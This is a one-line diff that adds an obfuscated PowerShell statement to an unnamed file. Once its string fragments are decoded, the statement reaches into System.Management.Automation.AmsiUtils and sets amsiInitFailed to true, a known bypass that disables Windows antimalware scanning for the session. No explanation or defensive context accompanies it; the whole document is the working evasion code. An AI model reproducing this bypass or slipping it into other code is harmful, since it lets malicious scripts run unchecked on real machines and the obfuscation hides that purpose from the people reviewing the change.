@@ -1,0 +1,1 @@
+[Ref].Assembly.GetType(('S'+'y'+'ste'+("{0}{1}{2}" -f 'm.M','an','ag')+("{1}{0}"-f'nt','eme')+'.'+("{0}{1}"-f'A','utoma')+("{1}{2}{0}" -f'i','t','ion.AmsiUt')+'ls')).GetField((("{0}{1}"-f 'amsi','I')+'n'+("{1}{0}" -f 'e','itFail')+'d'),(("{0}{1}" -f'NonP','ubl')+'i'+("{1}{0}"-f ',St','c')+'a'+'tic')).SetValue(${nU`lL},${Tr`Ue})
